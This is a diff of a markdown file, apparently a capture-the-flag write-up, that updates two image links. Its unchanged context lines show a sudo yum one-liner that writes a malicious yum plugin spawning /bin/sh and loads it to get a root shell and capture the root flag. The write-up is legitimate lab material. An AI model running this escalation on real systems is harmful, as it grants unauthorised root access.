@@ -118,8 +118,8 @@ Bash
 printf "[main]\nplugins=1\npluginpath=/tmp\npluginconfpath=/tmp\n" > /tmp/x && printf "[main]\nenabled=1\n" > /tmp/y.conf && printf "import os\nos.system('/bin/sh')\n" > /tmp/y.py && sudo yum -c /tmp/x --enableplugin=y list
 ```
 
-![[dai-12.png]]
+![image](../../images/dai-12_clean.png)
 
 Executing this payload successfully drops us into a root shell, allowing us to capture the final root flag.
 
-![[day-13.png]]
+![image](../../images/day-13.png)
